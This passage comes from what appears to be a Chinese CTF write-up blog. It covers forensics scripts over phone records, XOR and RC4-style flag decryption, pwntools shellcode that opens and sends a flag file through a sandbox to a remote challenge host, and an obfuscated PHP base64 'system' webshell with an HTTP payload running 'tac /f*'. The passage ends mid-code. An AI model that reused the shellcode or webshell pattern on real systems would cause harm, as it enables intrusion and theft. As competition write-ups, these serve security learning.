class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">已知 6 位嫌疑人的手机号分别是：</span><br><span class="line">135****2345</span><br><span class="line">138****7383</span><br><span class="line">153****9888</span><br><span class="line">155****7991</span><br><span class="line">157****0947</span><br><span class="line">170****5678</span><br></pre></td></tr></table></figure><p>找出和<code>170****5678</code>通话，微信图片_20250519152440.png和微信图片_20250519152452.png，其中全是该嫌疑人通话，</p><p><img src="/../images/achieve/2025/5/%E7%AC%AC%E4%B8%89%E5%B1%8A%E9%BB%84%E6%B2%B3%E6%B5%81%E5%9F%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E6%8C%91%E6%88%98%E8%B5%9B/QQ20250524-174501.jpg" alt="1"></p><p><img src="/../images/achieve/2025/5/%E7%AC%AC%E4%B8%89%E5%B1%8A%E9%BB%84%E6%B2%B3%E6%B5%81%E5%9F%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E6%8C%91%E6%88%98%E8%B5%9B/QQ20250524-174521.jpg" alt="1"></p><p>慢慢找，找出是<code>flag&#123;133****0181&#125;</code></p><h2 id="002"><a href="#002" class="headerlink" title="002"></a>002</h2><p><img src="/../images/achieve/2025/5/%E7%AC%AC%E4%B8%89%E5%B1%8A%E9%BB%84%E6%B2%B3%E6%B5%81%E5%9F%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E6%8C%91%E6%88%98%E8%B5%9B/QQ20250524-180050.jpg" alt="1"></p><p>对<code>135****2345</code>开头的嫌疑人进行了部分排查，写个脚本进行处理</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> defaultdict</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_common_contacts</span>(<span class="params">target_numbers, call_records_df</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    找出与所有给定电话号码都有过通话记录的电话号码</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    参数:</span></span><br><span class="line"><span class="string">        target_numbers (list): 需要查找的电话号码列表</span></span><br><span class="line"><span class="string">        call_records_df (DataFrame): 包含通话记录的DataFrame</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    返回:</span></span><br><span class="line"><span class="string">        set: 与所有给定号码都有通话记录的电话号码集合</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="comment"># 为每个目标电话号码创建联系人集合</span></span><br><span class="line">    contacts = defaultdict(<span class="built_in">set</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 处理每一行通话记录</span></span><br><span class="line">    <span class="keyword">for</span> _, row <span class="keyword">in</span> call_records_df.iterrows():</span><br><span class="line">        caller = row[<span class="string">&#x27;本机号码&#x27;</span>]</span><br><span class="line">        receiver = row[<span class="string">&#x27;对方号码&#x27;</span>]</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 记录通话关系</span></span><br><span class="line">        <span class="keyword">if</span> caller <span class="keyword">in</span> target_numbers:</span><br><span class="line">            contacts[caller].add(receiver)</span><br><span class="line">        <span class="keyword">if</span> receiver <span class="keyword">in</span> target_numbers:</span><br><span class="line">            contacts[receiver].add(caller)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 检查是否所有目标号码都有联系人</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(contacts) &lt; <span class="built_in">len</span>(target_numbers):</span><br><span class="line">        missing_numbers = <span class="built_in">set</span>(target_numbers) - <span class="built_in">set</span>(contacts.keys())</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;警告: 以下号码在通话记录中未找到: <span class="subst">&#123;<span class="string">&#x27;, &#x27;</span>.join(missing_numbers)&#125;</span>&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 找出所有目标号码的联系人集合</span></span><br><span class="line">    all_contacts = [contacts.get(num, <span class="built_in">set</span>()) <span class="keyword">for</span> num <span class="keyword">in</span> target_numbers <span class="keyword">if</span> num <span class="keyword">in</span> contacts]</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 找出所有集合的交集</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> all_contacts:</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">set</span>()</span><br><span class="line">    </span><br><span class="line">    common_contacts = <span class="built_in">set</span>.intersection(*all_contacts)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 确保目标号码不包含在结果中</span></span><br><span class="line">    <span class="keyword">return</span> common_contacts - <span class="built_in">set</span>(target_numbers)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="comment"># 给定的电话号码列表</span></span><br><span class="line">    target_numbers = [</span><br><span class="line">        <span class="string">&#x27;135****2345&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;138****7383&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;153****9888&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;155****7991&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;157****0947&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;170****5678&#x27;</span></span><br><span class="line">    ]</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 从Excel文件读取数据</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># 获取文件名（允许从命令行参数指定）</span></span><br><span class="line">        file_name = sys.argv[<span class="number">1</span>] <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) &gt; <span class="number">1</span> <span class="keyword">else</span> <span class="string">&#x27;工作簿2.xlsx&#x27;</span></span><br><span class="line">        sheet_name = sys.argv[<span class="number">2</span>] <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) &gt; <span class="number">2</span> <span class="keyword">else</span> <span class="string">&#x27;Sheet1&#x27;</span></span><br><span class="line">        </span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;正在从 <span class="subst">&#123;file_name&#125;</span> 的 <span class="subst">&#123;sheet_name&#125;</span> 表中读取数据...&quot;</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 读取Excel文件</span></span><br><span class="line">        call_records_df = pd.read_excel(file_name, sheet_name=sheet_name)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 检查列名是否正确</span></span><br><span class="line">        required_columns = [<span class="string">&#x27;本机号码&#x27;</span>, <span class="string">&#x27;对方号码&#x27;</span>]</span><br><span class="line">        missing_columns = [col <span class="keyword">for</span> col <span class="keyword">in</span> required_columns <span class="keyword">if</span> col <span class="keyword">not</span> <span class="keyword">in</span> call_records_df.columns]</span><br><span class="line">        <span class="keyword">if</span> missing_columns:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;错误：Excel文件中缺少以下列: <span class="subst">&#123;<span class="string">&#x27;, &#x27;</span>.join(missing_columns)&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 数据预处理</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;原始数据包含 <span class="subst">&#123;<span class="built_in">len</span>(call_records_df)&#125;</span> 条记录&quot;</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 确保号码格式一致（转为字符串）</span></span><br><span class="line">        call_records_df[<span class="string">&#x27;本机号码&#x27;</span>] = call_records_df[<span class="string">&#x27;本机号码&#x27;</span>].astype(<span class="built_in">str</span>)</span><br><span class="line">        call_records_df[<span class="string">&#x27;对方号码&#x27;</span>] = call_records_df[<span class="string">&#x27;对方号码&#x27;</span>].astype(<span class="built_in">str</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 去除重复记录</span></span><br><span class="line">        call_records_df = call_records_df.drop_duplicates(subset=[<span class="string">&#x27;本机号码&#x27;</span>, <span class="string">&#x27;对方号码&#x27;</span>])</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;去重后包含 <span class="subst">&#123;<span class="built_in">len</span>(call_records_df)&#125;</span> 条记录&quot;</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 调用函数查找共同联系人</span></span><br><span class="line">        common_numbers = find_common_contacts(target_numbers, call_records_df)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 打印结果</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;\n与所有给定电话号码都有通话记录的电话号码: <span class="subst">&#123;<span class="built_in">len</span>(common_numbers)&#125;</span> 个&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> common_numbers:</span><br><span class="line">            <span class="keyword">for</span> num <span class="keyword">in</span> <span class="built_in">sorted</span>(common_numbers):</span><br><span class="line">                <span class="built_in">print</span>(num)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;没有找到共同联系人&quot;</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 将结果保存到新的Excel文件</span></span><br><span class="line">        output_file = <span class="string">&#x27;共同联系人结果.xlsx&#x27;</span></span><br><span class="line">        result_df = pd.DataFrame(&#123;<span class="string">&#x27;共同联系人&#x27;</span>: <span class="built_in">list</span>(common_numbers)&#125;)</span><br><span class="line">        result_df.to_excel(output_file, index=<span class="literal">False</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;\n结果已保存到 &#x27;<span class="subst">&#123;output_file&#125;</span>&#x27;&quot;</span>)</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">except</span> FileNotFoundError:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;错误：找不到文件 &#x27;<span class="subst">&#123;file_name&#125;</span>&#x27;&quot;</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;发生错误: <span class="subst">&#123;<span class="built_in">str</span>(e)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>得到<code>flag&#123;158****6074&#125;</code></p><h2 id="004"><a href="#004" class="headerlink" title="004"></a>004</h2><p><code>138****7383</code>把这个号码的所有都提取出来，有448个，把时间锁定</p><p><img src="/../images/achieve/2025/5/%E7%AC%AC%E4%B8%89%E5%B1%8A%E9%BB%84%E6%B2%B3%E6%B5%81%E5%9F%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E6%8C%91%E6%88%98%E8%B5%9B/QQ20250524-184505.jpg" alt="1"></p><p>类似的挨着找出来即可</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;130****9357-137****5632-139****2928-183****5333&#125;</span><br></pre></td></tr></table></figure><h2 id="qrd"><a href="#qrd" class="headerlink" title="qrd"></a>qrd</h2><p>flag格式为part1&#x2F;part2，打开part1，发现是进行了某些加密，丢给gpt分析</p><p><img src="/../images/achieve/2025/5/%E7%AC%AC%E4%B8%89%E5%B1%8A%E9%BB%84%E6%B2%B3%E6%B5%81%E5%9F%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E6%8C%91%E6%88%98%E8%B5%9B/image-20250524175423699.png" alt="image-20250524175423699"></p><p>梭哈解密脚本，得到第一段flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 已知的加密部分</span></span><br><span class="line">encrypted = [<span class="number">88</span>, <span class="number">47</span>, <span class="number">80</span>, <span class="number">54</span>, <span class="number">95</span>, <span class="number">57</span>, <span class="number">90</span>, <span class="number">54</span>, <span class="number">94</span>, <span class="number">47</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 对应的异或密钥（交替使用）</span></span><br><span class="line">keys = [<span class="number">0x31</span>, <span class="number">0x58</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 解密逻辑</span></span><br><span class="line">decrypted = <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">chr</span>(byte ^ keys[i % <span class="number">2</span>]) <span class="keyword">for</span> i, byte <span class="keyword">in</span> <span class="built_in">enumerate</span>(encrypted))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 输出结果</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Decrypted flag:&quot;</span>, decrypted)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Decrypted flag: iwannaknow</span></span><br></pre></td></tr></table></figure><p>第二段看图标可以知道是python打包的exe，常规反编译即可，用在线网站反编译后发现还需要一个decrypt函数</p><p><img src="/../images/achieve/2025/5/%E7%AC%AC%E4%B8%89%E5%B1%8A%E9%BB%84%E6%B2%B3%E6%B5%81%E5%9F%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E6%8C%91%E6%88%98%E8%B5%9B/image-20250524175713874.png" alt="image-20250524175713874"></p><p>在pyz打包的目录中找到secret.pyc，反编译得到decrypt函数</p><p><img src="/../images/achieve/2025/5/%E7%AC%AC%E4%B8%89%E5%B1%8A%E9%BB%84%E6%B2%B3%E6%B5%81%E5%9F%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E6%8C%91%E6%88%98%E8%B5%9B/image-20250524175750635.png" alt="image-20250524175750635"></p><p>丢给gpt写脚本即可：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">key_schedule</span>(<span class="params">key: <span class="built_in">bytes</span></span>) -&gt; <span class="built_in">list</span>:</span><br><span class="line">    S = <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">128</span>))</span><br><span class="line">    v6 = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">128</span>):</span><br><span class="line">        v6 = (S[j] + key[j % <span class="built_in">len</span>(key)] + v6) % <span class="number">128</span></span><br><span class="line">        v6 = (v6 ^ <span class="number">55</span>) % <span class="number">128</span></span><br><span class="line">        S[j], S[v6] = (S[v6], S[j])</span><br><span class="line">    <span class="keyword">return</span> S</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">next_byte</span>(<span class="params">state: <span class="built_in">dict</span></span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">    S = state[<span class="string">&#x27;S&#x27;</span>]</span><br><span class="line">    state[<span class="string">&#x27;i&#x27;</span>] = (state[<span class="string">&#x27;i&#x27;</span>] + <span class="number">1</span>) % <span class="number">128</span></span><br><span class="line">    state[<span class="string">&#x27;j&#x27;</span>] = (state[<span class="string">&#x27;j&#x27;</span>] + S[state[<span class="string">&#x27;i&#x27;</span>]]) % <span class="number">128</span></span><br><span class="line">    S[state[<span class="string">&#x27;i&#x27;</span>]], S[state[<span class="string">&#x27;j&#x27;</span>]] = (S[state[<span class="string">&#x27;j&#x27;</span>]], S[state[<span class="string">&#x27;i&#x27;</span>]])</span><br><span class="line">    v2 = S[(S[state[<span class="string">&#x27;i&#x27;</span>]] + S[state[<span class="string">&#x27;j&#x27;</span>]]) % <span class="number">128</span>]</span><br><span class="line">    <span class="keyword">return</span> (<span class="number">16</span> * v2 | v2 &gt;&gt; <span class="number">4</span>) &amp; <span class="number">255</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">ciphertext: <span class="built_in">bytes</span>, key: <span class="built_in">bytes</span></span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">    state = &#123;<span class="string">&#x27;S&#x27;</span>: key_schedule(key), <span class="string">&#x27;i&#x27;</span>: <span class="number">0</span>, <span class="string">&#x27;j&#x27;</span>: <span class="number">0</span>&#125;</span><br><span class="line">    plaintext = <span class="built_in">bytearray</span>()</span><br><span class="line">    <span class="keyword">for</span> byte <span class="keyword">in</span> ciphertext:</span><br><span class="line">        plaintext.append(byte ^ next_byte(state))</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>(plaintext)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># key 和 ciphertext 来自 WO0o.py</span></span><br><span class="line">key = <span class="built_in">bytes</span>.fromhex(</span><br><span class="line">    <span class="string">&#x27;EC3700DFCD4F364EC54B19C5E7E26DEF6A25087C4FCDF4F8507A40A9019E3B48BD70129D0141A5B8F089F280F4BE6CCD&#x27;</span>)</span><br><span class="line">ciphertext = <span class="string">b&#x27;\xd4z\&#x27;0L\x10\xca\x0b\x0b\xaa\x15\xbeK0&quot;\xbf\xb2\xc6\x05&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 解密得到 flag</span></span><br><span class="line">flag = decrypt(ciphertext, key)</span><br><span class="line"><span class="built_in">print</span>(flag.decode())</span><br><span class="line"></span><br><span class="line"><span class="comment"># what_DO_you_mean#@!</span></span><br></pre></td></tr></table></figure><p>拼接即为flag</p><h2 id="小馋猫"><a href="#小馋猫" class="headerlink" title="小馋猫"></a>小馋猫</h2><p>题目开启沙箱</p><p><img src="/../images/achieve/2025/5/%E7%AC%AC%E4%B8%89%E5%B1%8A%E9%BB%84%E6%B2%B3%E6%B5%81%E5%9F%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E6%8C%91%E6%88%98%E8%B5%9B/QQ20250524-170632.jpg" alt="image-20250524164221697"></p><p>限制了一堆函数，但是可以使用open和sendfile函数</p><p>程序逻辑限制只能有一次syscall</p><p><img src="/../images/achieve/2025/5/%E7%AC%AC%E4%B8%89%E5%B1%8A%E9%BB%84%E6%B2%B3%E6%B5%81%E5%9F%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E6%8C%91%E6%88%98%E8%B5%9B/QQ20250524-170652.jpg" alt="image-20250524164325746"></p><p>并且清空了常见的寄存器，可以从xmm0寄存器中mov到rdi一个地址</p><p>恢复栈，然后调用一次open,之后布置好参数，jmp短跳转到上一次syscall,执行第二次sendfile的系统调用</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment"># p=process(&quot;./pwn&quot;)</span></span><br><span class="line"></span><br><span class="line">p=remote(<span class="string">&quot;175.27.229.115&quot;</span>,<span class="number">7470</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">shellcode=asm(<span class="string">&#x27;&#x27;&#x27;              </span></span><br><span class="line"><span class="string">movq rdi, xmm0</span></span><br><span class="line"><span class="string">mov rsp,rdi </span></span><br><span class="line"><span class="string">mov rax, 2      </span></span><br><span class="line"><span class="string">mov rdi, 0x67616c662f2e   </span></span><br><span class="line"><span class="string">push rdi</span></span><br><span class="line"><span class="string">mov rdi, rsp</span></span><br><span class="line"><span class="string">nop</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">mov  rsi,rax  </span></span><br><span class="line"><span class="string">mov rax,40  </span></span><br><span class="line"><span class="string">mov rdi,1</span></span><br><span class="line"><span class="string">mov r10,0x100</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x30</span>+shellcode+<span class="string">b&#x27;\xeb\xe3&#x27;</span>)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">怎么感觉和想象中的不一样</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>京麒CTF2025热身赛</title>
    <link href="https://baozongwi.xyz/posts/1ce177a3.html"/>
    <id>https://baozongwi.xyz/posts/1ce177a3.html</id>
    <published>2025-05-22T04:31:58.000Z</published>
    <updated>2025-08-08T04:17:25.452Z</updated>
    
    <content type="html"><![CDATA[<p>本来不想来看的，但是群里一直在复读，难道会很有意思？</p><h2 id="Execute"><a href="#Execute" class="headerlink" title="Execute"></a>Execute</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;edoced_46esab&#x27;</span>;</span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">strrev</span>(<span class="variable">$a</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$d</span> = <span class="string">&#x27;c3~@#@#@lz!@dGVt&#x27;</span>;</span><br><span class="line"><span class="variable">$s</span> = <span class="variable">$b</span>(<span class="variable">$d</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$s</span>;</span><br><span class="line"><span class="variable">$s</span>(<span class="variable">$_POST</span>[<span class="number">1</span>]);</span><br><span class="line"><span class="variable">$e</span>=<span class="string">&#x27;php&#x27;</span>;</span><br><span class="line"><span class="variable">$f</span>=<span class="string">&#x27;in&#x27;</span>;</span><br><span class="line"><span class="variable">$w</span>=<span class="string">&#x27;fo&#x27;</span>;</span><br><span class="line"><span class="variable">$g</span>=<span class="variable">$e</span>.<span class="variable">$f</span>.<span class="variable">$w</span>;</span><br><span class="line"><span class="variable">$g</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/execute.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>39.106.16.204:44099</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://39.106.16.204:44099</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9,en;q=0.8</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://39.106.16.204:44099/</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>216</span><br><span class="line"></span><br><span class="line"><span class="language-apache"><span class="attribute">code</span>=%<span class="number">3</span>C%<span class="number">3</span>Fphp%<span class="number">0</span>A%<span class="number">24</span>a%<span class="number">20</span>%<span class="number">3</span>D%<span class="number">20</span>&#x27;edoced_46esab&#x27;%<span class="number">3</span>B%<span class="number">0</span>A%<span class="number">24</span>b%<span class="number">20</span>%<span class="number">3</span>D%<span class="number">20</span>strrev(%<span class="number">24</span>a)%<span class="number">3</span>B%<span class="number">0</span>A%<span class="number">0</span>A%<span class="number">24</span>d%<span class="number">20</span>%<span class="number">3</span>D%<span class="number">20</span>&#x27;c3~%<span class="number">40</span>%<span class="number">23</span>%<span class="number">40</span>%<span class="number">23</span>%<span class="number">40</span>lz!%<span class="number">40</span>dGVt&#x27;%<span class="number">3</span>B%<span class="number">0</span>A%<span class="number">24</span>s%<span class="number">20</span>%<span class="number">3</span>D%<span class="number">20</span>%<span class="number">24</span>b(%<span class="number">24</span>d)%<span class="number">3</span>B%<span class="number">0</span>A%<span class="number">0</span>Aecho%<span class="number">20</span>%<span class="number">24</span>s%<span class="number">3</span>B%<span class="number">0</span>A%<span class="number">24</span>s(%<span class="number">24</span>_POST%<span class="number">5</span>B1%<span class="number">5</span>D)%<span class="number">3</span>B%<span class="number">0</span>A%<span class="number">3</span>F%<span class="number">3</span>E&amp;<span class="number">1</span>=tac /f*</span></span><br></pre></td></tr></table></figure><p>没压力啊，直接秒了</p><h2 id="EzLogin"><a href="#EzLogin" class="headerlink" title="EzLogin"></a>EzLogin</h2><p>没什么思路，扫描一下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 